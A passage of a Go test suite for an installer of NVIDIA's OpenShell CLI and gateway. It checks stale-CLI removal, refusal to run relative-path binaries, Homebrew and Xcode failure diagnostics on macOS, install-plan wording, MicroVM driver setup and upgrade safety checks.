		if !errors.Is(err, openshell.ErrStaleCLI) || !strings.Contains(err.Error(), "rm "+legacy) || !strings.Contains(err.Error(), "installed at "+f.cliPath) {
			t.Fatalf("Install = %v", err)
		}
		if !strings.Contains(f.out.String(), "then remove the old CLI") || !strings.Contains(f.out.String(), "    rm "+legacy) {
			t.Fatalf("plan does not say to remove the old CLI:\n%s", f.out.String())
		}
		if env := f.scriptRun().Env; !slices.Contains(env, "OPENSHELL_REGISTER_BIN="+f.cliPath) {
			t.Fatalf("installer registers the gateway with PATH's CLI: env %v", env)
		}
	})
	t.Run("removed as the plan says", func(t *testing.T) {
		f, legacy := setup(t)
		f.inst.ConfirmBreakingUpgrade = func(*openshell.InstallPlan) (bool, error) { return true, os.Remove(legacy) }
		if res, err := f.inst.Install(context.Background()); err != nil || res.CLIVersion.String() != openshell.InstallerVersion {
			t.Fatalf("Install = %+v, %v", res, err)
		}
	})
}

// TestInstallNeverRunsRelativeCandidates covers a fresh install (no CLI on
// PATH) from a directory holding .local/bin/openshell: with HOME unset or
// relative the default home candidate would name that file, and the
// installer would run it as the existing CLI.
func TestInstallNeverRunsRelativeCandidates(t *testing.T) {
	for _, tc := range []struct {
		name, home string
		candidates []string
	}{
		{name: "HOME unset", home: ""},
		{name: "HOME relative", home: "relhome"},
		{name: "relative candidate", home: "/nonexistent-home", candidates: []string{filepath.Join(".local", "bin", "openshell")}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
			work := t.TempDir()
			for _, dir := range []string{work, filepath.Join(work, "relhome")} {
				if err := os.MkdirAll(filepath.Join(dir, ".local", "bin"), 0o755); err != nil {
					t.Fatal(err)
				}
				writeExecutable(t, filepath.Join(dir, ".local", "bin", "openshell"))
			}
			t.Chdir(work)
			t.Setenv("HOME", tc.home)
			f.inst.Candidates = tc.candidates
			f.inst.Consent = func(*openshell.InstallPlan) (bool, error) { return false, nil }
			_, _ = f.inst.Install(context.Background())
			for _, c := range f.runner.Calls() {
				if !filepath.IsAbs(c.Name) {
					t.Fatalf("installer ran %q, a path relative to the working directory", c.Name)
				}
			}
		})
	}
	t.Run("absolute HOME still probed", func(t *testing.T) {
		f := newInstallFixture(t, fakeScript, "", "")
		home := t.TempDir()
		cli := filepath.Join(home, ".local", "bin", "openshell")
		if err := os.MkdirAll(filepath.Dir(cli), 0o755); err != nil {
			t.Fatal(err)
		}
		writeExecutable(t, cli)
		f.runner.On(cli+" --version", "openshell "+openshell.InstallerVersion+"\n", nil)
		t.Setenv("HOME", home)
		f.inst.Candidates = nil
		if res, err := f.inst.Install(context.Background()); err != nil || res.Installed || res.Plan.Existing == nil || res.Plan.Existing.Path != cli {
			t.Fatalf("Install = %+v, %v; want the CLI in the home directory found", res, err)
		}
	})
}

func TestInstallVerifiesOutcome(t *testing.T) {
	for _, tc := range []struct {
		name, after string
		mutate      func(f *installFixture)
		wantErr     string
	}{
		{"cli still old", "openshell 0.0.40", nil, "0.0.40"},
		{"no cli after install", "", nil, "no openshell CLI"},
		{"gateway unhealthy", "openshell " + openshell.InstallerVersion, func(f *installFixture) {
			f.inst.VerifyGateway = func(context.Context) error { return errors.New("connection refused") }
		}, "gateway is not healthy"},
		{"installer fails", "openshell " + openshell.InstallerVersion, func(f *installFixture) { f.runner.On("/bin/sh", "", errors.New("exit status 1")) }, "installer failed"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newInstallFixture(t, fakeScript, "", tc.after)
			if tc.mutate != nil {
				tc.mutate(f)
			}
			if _, err := f.inst.Install(context.Background()); err == nil || !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("Install = %v, want %q", err, tc.wantErr)
			}
			f.assertNoLeftovers()
		})
	}
}

// TestInstallFailureOnMacOSNamesHomebrew: on macOS the script installs the
// nvidia/openshell Homebrew formula, which Homebrew refuses to build with
// an Xcode older than it wants; the failure says Homebrew failed, where it
// used to say only "installer failed: /bin/sh: exit status 1" (manual test
// M6).
func TestInstallFailureOnMacOSNamesHomebrew(t *testing.T) {
	for goos, homebrew := range map[string]bool{"darwin": true, "linux": false} {
		f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
		f.inst.GOOS = goos
		f.runner.On("/bin/sh", "", errors.New("exit status 1"))
		_, err := f.inst.Install(context.Background())
		if err == nil || errors.Is(err, openshell.ErrHomebrewInstall) != homebrew || !strings.Contains(err.Error(), "exit status 1") {
			t.Fatalf("%s: Install = %v", goos, err)
		}
	}
}

func TestInstallOnMacTMUXHandlesBrewServicesRefusal(t *testing.T) {
	t.Setenv("TMUX", "/tmp/test-tmux")
	for _, running := range []bool{false, true} {
		f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
		f.inst.GOOS = "darwin"
		f.runner.OnFunc("/bin/sh", func(context.Context, openshell.Command) ([]byte, error) {
			writeExecutable(t, f.cliPath)
			return []byte("Usage: brew services restart (formula)\nError: Invalid usage: `brew services` cannot run under tmux!\n"), nil
		})
		f.runner.On(f.cliPath+" --version", "openshell "+openshell.InstallerVersion, nil)
		f.inst.VerifyGateway = func(context.Context) error {
			f.verified++
			if running {
				return nil
			}
			return errors.New("gateway not registered")
		}
		res, err := f.inst.Install(context.Background())
		if f.verified != 1 || strings.Contains(f.out.String(), "Usage: brew services") {
			t.Fatalf("running=%v: probe count=%d output=%q", running, f.verified, f.out.String())
		}
		if running && (err != nil || res == nil || !res.Installed) {
			t.Fatalf("running gateway fallback = %+v, %v", res, err)
		}
		if !running && !errors.Is(err, openshell.ErrBrewServicesTmux) {
			t.Fatalf("stopped gateway error = %v", err)
		}
	}
}

// TestInstallInAHomebrewOfYourOwn: with Homebrew outside /opt/homebrew and
// /usr/local (a standard user's own, GAP-0110) the formula installed and
// the gateway ran, then NVIDIA's script failed registering it ("mTLS
// certificates for gateway 'openshell' were not found": the CLI looks for
// them only under those two prefixes), and the error blamed Homebrew and
// Xcode. The script now gets OPENSHELL_LOCAL_TLS_DIR, the plan says so, and
// a failure after the formula is installed says that instead of blaming it.
func TestInstallInAHomebrewOfYourOwn(t *testing.T) {
	prefix := filepath.Join(t.TempDir(), "homebrew")
	tls := filepath.Join(prefix, "var", "openshell", "tls")
	f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
	f.inst.GOOS, f.inst.BrewPrefix = "darwin", prefix
	res, err := f.inst.Install(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	want := openshell.EnvLocalTLSDir + "=" + tls
	if !slices.Contains(f.scriptRun().Env, want) || !slices.Contains(res.Plan.Env, want) || !strings.Contains(f.out.String(), "Command     OPENSHELL_VERSION="+openshell.InstallerTag+" "+want+" ") ||
		!strings.Contains(f.out.String(), "Homebrew has no prebuilt packages for that prefix") {
		t.Fatalf("env %v; plan:\n%s", f.scriptRun().Env, f.out.String())
	}
	// The prefixes the CLI searches need nothing.
	f = newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
	f.inst.GOOS = "darwin"
	if _, err := f.inst.Install(context.Background()); err != nil {
		t.Fatal(err)
	}
	for _, kv := range f.scriptRun().Env {
		if strings.HasPrefix(kv, openshell.EnvLocalTLSDir+"=") {
			t.Fatalf("env %v under /opt/homebrew", f.scriptRun().Env)
		}
	}
	// An old keg must not make a failed upgrade look like installation
	// finished. A new keg written before a later failure still counts.
	for _, scenario := range []struct {
		name, before, during string
		installed            bool
	}{
		{"no keg", "", "", false},
		{"old keg", "0.1.0", "", false},
		{"new keg", "0.1.0", "0.1.1", true},
	} {
		t.Run(scenario.name, func(t *testing.T) {
			prefix := filepath.Join(t.TempDir(), "homebrew")
			keg := filepath.Join(prefix, "Cellar", "openshell")
			link := filepath.Join(prefix, "opt", "openshell")
			linkKeg := func(version string) {
				t.Helper()
				target := filepath.Join(keg, version)
				if err := os.MkdirAll(target, 0o755); err != nil {
					t.Fatal(err)
				}
				if err := os.MkdirAll(filepath.Dir(link), 0o755); err != nil {
					t.Fatal(err)
				}
				if err := os.Remove(link); err != nil && !os.IsNotExist(err) {
					t.Fatal(err)
				}
				if err := os.Symlink(target, link); err != nil {
					t.Fatal(err)
				}
			}
			if scenario.before != "" {
				linkKeg(scenario.before)
			}
			f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
			f.inst.GOOS, f.inst.BrewPrefix = "darwin", prefix
			f.runner.OnFunc("/bin/sh", func(context.Context, openshell.Command) ([]byte, error) {
				if scenario.during != "" {
					linkKeg(scenario.during)
				}
				return nil, errors.New("exit status 1")
			})
			_, err := f.inst.Install(context.Background())
			var hb *openshell.HomebrewInstallError
			if !errors.As(err, &hb) || hb.FormulaInstalled != scenario.installed ||
				strings.Contains(err.Error(), "formula is installed, but") != scenario.installed {
				t.Fatalf("%s: Install = %v", scenario.name, err)
			}
		})
	}
}

// TestInstallRefusesAHomebrewThisUserCannotWrite: NVIDIA's script runs
// Homebrew as you, without sudo. On a Mac whose Homebrew belongs to an
// administrator, a standard user's install failed halfway with "Permission
// denied @ dir_s_mkdir - /opt/homebrew/Library/Taps/nvidia" and a hint
// about Xcode (GAP-0109). The installer refuses first, before it downloads
// or runs anything, and names the owner and the directory.
func TestInstallRefusesAHomebrewThisUserCannotWrite(t *testing.T) {
	prefix := t.TempDir()
	taps := filepath.Join(prefix, "Library", "Taps")
	if err := os.MkdirAll(taps, 0o755); err != nil {
		t.Fatal(err)
	}
	f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
	f.inst.GOOS, f.inst.BrewPrefix = "darwin", prefix
	f.inst.Writable = func(dir string) bool { return dir != taps }
	_, err := f.inst.Install(context.Background())
	var hw *openshell.HomebrewNotWritableError
	if !errors.Is(err, openshell.ErrHomebrewNotWritable) || !errors.As(err, &hw) || hw.Prefix != prefix || hw.Dir != taps || f.hits.Load() != 0 || f.ran() {
		t.Fatalf("Install = %v (downloads %d, ran %t)", err, f.hits.Load(), f.ran())
	}
	if !strings.Contains(hw.Problem(), "cannot write to "+taps) || !strings.Contains(hw.Fix(), "a Homebrew of your own") {
		t.Fatalf("problem %q, fix %q", hw.Problem(), hw.Fix())
	}
	// The e2fsprogs install runs Homebrew in the same prefix.
	if err := f.inst.InstallE2fsprogs(context.Background()); !errors.Is(err, openshell.ErrHomebrewNotWritable) || f.runner.Called("brew") {
		t.Fatalf("InstallE2fsprogs = %v; calls %v", err, f.runner.Calls())
	}
	// A prefix this user can write installs.
	f.inst.Writable = func(string) bool { return true }
	if _, err := f.inst.Install(context.Background()); err != nil || !f.ran() {
		t.Fatalf("Install = %v (ran %t)", err, f.ran())
	}
}

// xcodeApp makes an Xcode.app of version (none when empty) and returns its
// path.
func xcodeApp(t *testing.T, version string) string {
	t.Helper()
	app := filepath.Join(t.TempDir(), "Xcode.app")
	if err := os.MkdirAll(filepath.Join(app, "Contents"), 0o755); err != nil {
		t.Fatal(err)
	}
	if version != "" {
		plist := "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\">\n<dict>\n\t<key>BuildVersion</key>\n\t<string>2</string>\n" +
			"\t<key>CFBundleShortVersionString</key>\n\t<string>" + version + "</string>\n\t<key>CFBundleVersion</key>\n\t<string>24553</string>\n</dict>\n</plist>\n"
		if err := os.WriteFile(filepath.Join(app, "Contents", "version.plist"), []byte(plist), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return app
}

// TestHomebrewFailureReportsTheDeveloperTools: Homebrew refused NVIDIA's
// formula on a Mac with "Your Xcode (26.2) at /Applications/Xcode.app is too
// outdated. Please update to Xcode 27.0 (or delete it).", while
// xcode-select selected the Command Line Tools 27.0, which were current.
// The failure carries what Homebrew checked, from sw_vers, xcode-select,
// pkgutil and Xcode.app's version.plist, so setup can say that the fix is
// that Xcode.app, not the Command Line Tools.
func TestHomebrewFailureReportsTheDeveloperTools(t *testing.T) {
	const clt = "/Library/Developer/CommandLineTools"
	for _, tc := range []struct {
		name, selected, cltVersion, xcode string
		noXcode, outdated                 bool
	}{
		{name: "current tools, old Xcode.app", selected: clt, cltVersion: "27.0.0.0.1.1788430756", xcode: "26.2", outdated: true},
		{name: "Xcode.app current", selected: clt, cltVersion: "27.0.0.0.1.1788430756", xcode: "27.0"},
		{name: "tools old too", selected: clt, cltVersion: "26.2.0.0.1.1764812424", xcode: "26.2"},
		{name: "Xcode.app selected", selected: "/Applications/Xcode.app/Contents/Developer", cltVersion: "27.0.0.0.1.1788430756", xcode: "26.2"},
		{name: "no Xcode.app", selected: clt, cltVersion: "27.0.0.0.1.1788430756", noXcode: true},
		{name: "Xcode.app version unknown", selected: clt, cltVersion: "27.0.0.0.1.1788430756"},
		{name: "no tools", xcode: "26.2"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
			f.inst.GOOS = "darwin"
			f.inst.XcodeApp = xcodeApp(t, tc.xcode)
			if tc.noXcode {
				f.inst.XcodeApp = filepath.Join(t.TempDir(), "Xcode.app")
			}
			f.runner.On("/bin/sh", "", errors.New("exit status 1"))
			f.runner.On("sw_vers -productVersion", "27.0\n", nil)
			if tc.selected != "" {
				f.runner.On("xcode-select -p", tc.selected+"\n", nil)
			} else {
				f.runner.On("xcode-select -p", "xcode-select: error: unable to get active developer directory\n", errors.New("exit status 2"))
			}
			if tc.cltVersion != "" {
				f.runner.On("pkgutil --pkg-info=com.apple.pkg.CLTools_Executables",
					"package-id: com.apple.pkg.CLTools_Executables\nversion: "+tc.cltVersion+"\nvolume: /\nlocation: /\ninstall-time: 1790090818\n", nil)
			}
			_, err := f.inst.Install(context.Background())
			var hb *openshell.HomebrewInstallError
			if !errors.Is(err, openshell.ErrHomebrewInstall) || !errors.As(err, &hb) || hb.Tools == nil ||
				err.Error() != "openshell: Homebrew could not install the nvidia/openshell formula (exit status 1)" {
				t.Fatalf("Install = %v", err)
			}
			d := hb.Tools
			if d.MacOS != "27.0" || d.Selected != tc.selected || d.CLT != tc.cltVersion || d.Xcode != tc.xcode || (d.XcodeApp == "") != tc.noXcode {
				t.Fatalf("developer tools = %+v", d)
			}
			if d.OutdatedXcodeApp() != tc.outdated {
				t.Fatalf("OutdatedXcodeApp = %t for %+v", !tc.outdated, d)
			}
			for _, c := range f.runner.Calls() {
				if c.Name == "brew" || (c.Name == "xcode-select" && len(c.Args) != 1) {
					t.Fatalf("ran %v", c)
				}
			}
		})
	}
	if v := openshell.ShortVersion("27.0.0.0.1.1788430756"); v != "27.0" {
		t.Fatalf("ShortVersion = %q", v)
	}
}

// TestInstallPlanOnMacOSSaysWhatItChanges: on a Mac NVIDIA's script
// updated Homebrew itself (Homebrew's auto-update: 7.0.7-12 to 7.0.7-38,
// with homebrew/core and homebrew/cask), wrote the release's openshell.rb
// over the tap's Formula/openshell.rb, and registered the "openshell"
// gateway in ~/.config/openshell, none of which the plan said. It says so
// now, and that no sudo is used.
func TestInstallPlanOnMacOSSaysWhatItChanges(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	t.Setenv("XDG_CONFIG_HOME", "")
	f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
	f.inst.GOOS = "darwin"
	res, err := f.inst.Install(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	plan := f.out.String()
	for _, want := range []string{
		"  Privileges  none: the script runs Homebrew as you, without sudo\n",
		"  Changes     Homebrew may update itself and its taps first (its auto-update, when due; HOMEBREW_NO_AUTO_UPDATE=1 skips it)\n",
		"              the release's openshell.rb replaces Formula/openshell.rb in the nvidia/openshell tap (created if missing)\n",
		"              the script installs the nvidia/openshell/openshell formula and starts the gateway with brew services\n",
		"              it registers that gateway as \"openshell\" in ~/.config/openshell, replacing a registration of that name\n",
	} {
		if !strings.Contains(plan, want) {
			t.Errorf("plan lacks %q:\n%s", want, plan)
		}
	}
	if res.Plan.ConfigDir != filepath.Join("~", ".config", "openshell") {
		t.Fatalf("plan config dir = %q", res.Plan.ConfigDir)
	}
	// Linux's plan is the package's.
	f = newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
	if _, err := f.inst.Install(context.Background()); err != nil {
		t.Fatal(err)
	}
	if plan := f.out.String(); strings.Contains(plan, "Homebrew") || !strings.Contains(plan, "the script uses sudo to install the openshell package") {
		t.Fatalf("linux plan:\n%s", plan)
	}
}

// TestInstallerPreparesTheMicroVMDriver: on a Mac the MicroVM driver needs
// e2fsprogs and a Hypervisor signature, which the installer gets from
// Homebrew once the user agreed; a failure says what Homebrew said.
func TestInstallerPreparesTheMicroVMDriver(t *testing.T) {
	f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
	f.runner.On("brew install e2fsprogs", "", nil)
	f.runner.On("brew postinstall nvidia/openshell/openshell", "Error: nvidia/openshell/openshell is not installed", errors.New("exit status 1"))
	if err := f.inst.InstallE2fsprogs(context.Background()); err != nil || !f.runner.Called("brew install e2fsprogs") {
		t.Fatalf("InstallE2fsprogs = %v; calls %v", err, f.runner.Calls())
	}
	err := f.inst.ResignVMDriver(context.Background())
	if err == nil || !strings.Contains(err.Error(), "brew postinstall nvidia/openshell/openshell: exit status 1: Error: nvidia/openshell/openshell is not installed") {
		t.Fatalf("ResignVMDriver = %v", err)
	}
	// The macOS install plan says the driver needs e2fsprogs too, which
	// setup offers next, only when it is missing: it said so on a Mac
	// whose e2fsprogs was installed, where setup offers nothing.
	keg := filepath.Join(t.TempDir(), "opt", "e2fsprogs", "sbin")
	const note = "a Mac runs sandboxes in OpenShell MicroVMs, whose driver also needs e2fsprogs, which the formula does not install " +
		"(brew install e2fsprogs; setup offers it next)"
	for _, installed := range []bool{false, true} {
		if installed {
			for _, tool := range []string{"mke2fs", "debugfs"} {
				if err := os.MkdirAll(keg, 0o755); err != nil {
					t.Fatal(err)
				}
				writeExecutable(t, filepath.Join(keg, tool))
			}
		}
		f = newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
		f.inst.GOOS, f.inst.E2fsprogsDirs = "darwin", []string{keg}
		if _, err := f.inst.Install(context.Background()); err != nil {
			t.Fatal(err)
		}
		if strings.Contains(f.out.String(), note) == installed {
			t.Fatalf("e2fsprogs installed %t, plan:\n%s", installed, f.out.String())
		}
	}
}

// TestAnUpgradeOverAGatewayItCannotReadWaitsForItsMicroVMs: the default
// PrepareUpgrade finds no usable registration of the gateway, whose
// MicroVM runs as the account (a registration that broke). It used to
// take that for a gateway with nothing to stop and run NVIDIA's script,
// whose restart ended the MicroVM with no flush. It now refuses with
// nothing run, for a legacy release too, and upgrades once none runs.
func TestAnUpgradeOverAGatewayItCannotReadWaitsForItsMicroVMs(t *testing.T) {
	for _, existing := range []string{"openshell 0.1.3", "openshell 0.1.5-pre.3"} {
		f := newInstallFixture(t, fakeScript, existing, "openshell "+openshell.InstallerVersion)
		f.inst.PrepareUpgrade = nil
		f.inst.Discover = openshell.DiscoverOptions{ConfigDir: t.TempDir()}
		f.inst.CountMicroVMs = func(context.Context) (int, error) { return 1, nil }
		if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrSandboxesRunning) || f.ran() ||
			!strings.Contains(err.Error(), "1 MicroVM run as this account") {
			t.Fatalf("%s, a MicroVM live: Install = %v (ran %v)", existing, err, f.ran())
		}
		f = newInstallFixture(t, fakeScript, existing, "openshell "+openshell.InstallerVersion)
		f.inst.PrepareUpgrade = nil
		f.inst.Discover = openshell.DiscoverOptions{ConfigDir: t.TempDir()}
		f.inst.CountMicroVMs = noMicroVMs
		if res, err := f.inst.Install(context.Background()); err != nil || !res.Installed || !f.ran() {
			t.Fatalf("%s, no MicroVM: Install = %+v, %v", existing, res, err)
		}
	}
}
